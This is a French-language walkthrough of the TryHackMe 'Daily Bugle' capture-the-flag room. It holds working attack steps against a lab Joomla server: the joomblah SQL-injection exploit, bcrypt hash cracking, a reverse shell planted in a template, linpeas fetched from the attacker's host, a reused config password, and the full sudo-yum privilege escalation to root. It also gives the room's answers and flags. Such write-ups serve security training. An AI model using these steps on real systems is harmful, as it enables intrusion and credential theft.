# Daily Bugle # 

## Task 1 Deploy ##

```bash
sudo sh -c "echo '10.10.1.183 daily.thm ' >> /etc/hosts"

tim@kali:~/Bureau/tryhackme/write-up$ nmap_all daily.thm
sudo nmap -A daily.thm -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 10:55 CET
Nmap scan report for daily.thm (10.10.1.183)
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/18%OT=22%CT=1%CU=32125%PV=Y%DS=2%DC=T%G=Y%TM=619623
OS:F7%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(SP=F
OS:F%GCD=1%ISR=10C%TI=Z%TS=A)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SE
OS:Q(SP=FF%GCD=1%ISR=10C%TI=Z%II=I%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   31.76 ms 10.9.0.1
2   32.06 ms daily.thm (10.10.1.183)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 231.28 seconds
```

Nmap nous indique plusieurs services qui sont : 
Le service SSH sur le port 22.  
Le service HTTP sur le port 80.   
Le service MySQL sur le port 3306.   

**Access the web server, who robbed the bank?**

![page](./Task1-01.png)  

Sur la page principale on voit que le voleur de la bank est spiderman  

# Task 2 Obtain user and root #  

**What is the Joomla version?**  

```bash
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://daily.thm ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://daily.thm/administrator/components
http://daily.thm/administrator/modules
http://daily.thm/administrator/templates
http://daily.thm/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://daily.thm/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://daily.thm/robots.txt 

Interesting path found from robots.txt
http://daily.thm/joomla/administrator/
http://daily.thm/administrator/
http://daily.thm/bin/
http://daily.thm/cache/
http://daily.thm/cli/
http://daily.thm/components/
http://daily.thm/includes/
http://daily.thm/installation/
http://daily.thm/language/
http://daily.thm/layouts/
http://daily.thm/libraries/
http://daily.thm/logs/
http://daily.thm/modules/
http://daily.thm/plugins/
http://daily.thm/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/daily.thm/
```

On voit la version de joomla est la 3.7.0 

**What is Jonah's cracked password**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py -nv
2021-11-18 11:12:21 URL:https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py [6024/6024] -> "joomblah.py" [1]
```

En cherchant sur internet on voit que joola est exploitable avec joomblah.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python2 joomblah.py http://daily.thm
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

On trouve le hash de jonah.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' >  hash

tim@kali:~/Bureau/tryhackme/write-up$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:04:01 DONE (2021-11-18 11:20) 0.004149g/s 194.3p/s 194.3c/s 194.3C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

On casse le mot de passe jonah qui est :  spiderman123 

**What is the user flag?**

[page](./Task1-02.png)
On se connecte sur l'interface joomla.    

[page](./Task1-03.png) 
On inclut un reverse shell dans le template.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

On écoute sur le port 1234 pour avoir un shell.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://daily.thm/templates/protostar/error.php
----
tim@kali:~/Bureau/tryhackme/write-up$ sudo nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.1.183.
Ncat: Connection from 10.10.1.183:34294.
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:39:40 up 47 min,  0 users,  load average: 0.03, 0.02, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```

On exécute le reverse shell et on obtient un shell.  

```bash
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
ls /home
jjameson
sh-4.2$ cd /home/jjameson 
cd /home/jjameson
sh: cd: /home/jjameson: Permission denied
```

On trouve un utilisateur jjameson mais on a pas la permision d'y aller.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ls linpeas.sh 
linpeas.sh
tim@kali:~/Bureau/tryhackme/write-up$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
sh-4.2$ cd /tmp
cd /tmp

sh-4.2$ wget http://10.9.228.66:8000/linpeas.sh -nv
wget http://10.9.228.66:8000/linpeas.sh -nv
2021-11-18 06:39:10 URL:http://10.9.228.66:8000/linpeas.sh [470149/470149] -> "linpeas.sh" [1]

sh-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh

./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

      /---------------------------------------------------------------------------\
      |                             Do you like PEASS?                            |
      |---------------------------------------------------------------------------| 
      |         Become a Patreon    :     https://www.patreon.com/peass           |
      |         Follow on Twitter   :     @carlospolopm                           |
      |         Respect on HTB      :     SirBroccoli & makikvues                 |
      |---------------------------------------------------------------------------|
      |                                 Thank you!                                |
      \---------------------------------------------------------------------------/
        linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...
...
╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files
/var/www/html/administrator/components/com_admin/views/profile/tmpl/edit.php:				<?php if ($field->fieldname == 'password2') : ?>
/var/www/html/administrator/components/com_config/model/application.php:						CURLOPT_PROXYUSERPWD => null,
/var/www/html/administrator/components/com_config/model/application.php:			'password' => JFactory::getConfig()->get('password'),
/var/www/html/administrator/components/com_joomlaupdate/controllers/update.php:			'password'  => $this->input->post->get('passwd', '', 'raw'),
/var/www/html/administrator/components/com_joomlaupdate/models/default.php:			'password'  => $config->get('ftp_pass'),
/var/www/html/administrator/components/com_joomlaupdate/models/default.php:		$password = JUserHelper::genRandomPassword(32);
/var/www/html/administrator/components/com_joomlaupdate/models/default.php:	'kickstart.security.password' => '$password',
/var/www/html/administrator/components/com_joomlaupdate/restore.php:		$this->password = AKFactory::get('kickstart.jps.password', '');
/var/www/html/administrator/components/com_joomlaupdate/restore.php:		'FTP_PASS'                        => '(S)FTP password:',
/var/www/html/administrator/components/com_joomlaupdate/restore.php:		'JPS_PASSWORD'                    => 'Archive Password (for JPS files)',
/var/www/html/administrator/components/com_joomlaupdate/restore.php:		self::$passwords[$lookupKey] = $key;
/var/www/html/administrator/components/com_joomlaupdate/restore.php:	$password = AKFactory::get('kickstart.security.password', null);
/var/www/html/administrator/components/com_joomlaupdate/restore.php:	protected $password = '';
/var/www/html/administrator/components/com_joomlaupdate/restore.php:	protected static $passwords = array();
/var/www/html/administrator/components/com_joomlaupdate/views/update/tmpl/default.php:	var joomlaupdate_password = '$password';
/var/www/html/administrator/components/com_joomlaupdate/views/upload/tmpl/captive.php:						<label for="mod-login-password" class="element-invisible">
/var/www/html/administrator/components/com_login/models/login.php:			'password' => $input->$method->get('passwd', '', 'RAW'),
/var/www/html/administrator/components/com_media/views/medialist/tmpl/details.php:	<input type="hidden" name="password" value="" />
/var/www/html/administrator/components/com_media/views/medialist/tmpl/thumbs.php:		<input type="hidden" name="password" value="" />
/var/www/html/administrator/components/com_users/views/user/tmpl/edit.php:							<?php if ($field->fieldname == 'password') : ?>
/var/www/html/administrator/modules/mod_login/tmpl/default.php:						<label for="mod-login-password" class="element-invisible">
/var/www/html/administrator/templates/hathor/html/mod_login/default.php:		<input name="passwd" id="mod-login-password" type="password" size="15" />
/var/www/html/components/com_users/controllers/user.php:			$data['password'] = '';
/var/www/html/components/com_users/controllers/user.php:		$credentials['password']  = $data['password'];
/var/www/html/components/com_users/controllers/user.php:		$data['password']  = $input->$method->get('password', '', 'RAW');
/var/www/html/components/com_users/models/profile.php:		$data['password'] = $data['password1'];
/var/www/html/components/com_users/models/registration.php:		$data['password'] = $data['password1'];
/var/www/html/components/com_users/models/registration.php:		$sendpassword = $params->get('sendpassword', 1);
/var/www/html/components/com_users/models/reset.php:		$user->password = JUserHelper::hashPassword($data['password1']);
/var/www/html/components/com_users/models/reset.php:		$user->password_clear = $data['password1'];
/var/www/html/components/com_users/views/profile/tmpl/edit.php:								<?php // Disables autocomplete ?> <input type="password" style="display:none">
/var/www/html/components/com_users/views/profile/tmpl/edit.php:							<?php if ($field->fieldname == 'password1') : ?>
/var/www/html/configuration.php:	public $password = 'nv5uz9r3ZEDzVjNu';

...
```

On transfère un outil d'énumération linpeas.sh.
On rend exécutable.  
On le lance et il nous trouve le mot de passe : nv5uz9r3ZEDzVjNu 

```bash
bash-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu

[jjameson@dailybugle tmp]$ cd /home/jjameson/
cd /home/jjameson/
[jjameson@dailybugle ~]$ ls
ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt	
cat user.txt
27a260fe3cba712cfdedb1c86d80442e   
```

On se connecte sur le compte de jjameson.   
On lit le fichier user.txt dans le répertoire /home/jjameson/  
Le flag est : 27a260fe3cba712cfdedb1c86d80442e   

**What is the root flag?**  

```bash
[jjameson@dailybugle ~]$ sudo -l
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
    
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

On voit que la configuration sudo permet d'exécuter yum avec les droits roots.  

[yum exploit](https://gtfobins.github.io/gtfobins/yum/) 

gtfobins nous explique comment avoir un shell root avec yum.  

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y

[jjameson@dailybugle ~]$ sudo /usr/bin/yum -c $TF/x --enableplugin=y
sudo /usr/bin/yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# cat /root/root.txt
cat /root/root.txt
eec3d53292b1821868266858d7fa6f79
```

On établit la procédure de gtfobins et on obtient un shell avec les droits root.  
On lit le fichier root.txt dans le répertoire root et on a le flag. 
Le flag est : eec3d53292b1821868266858d7fa6f79   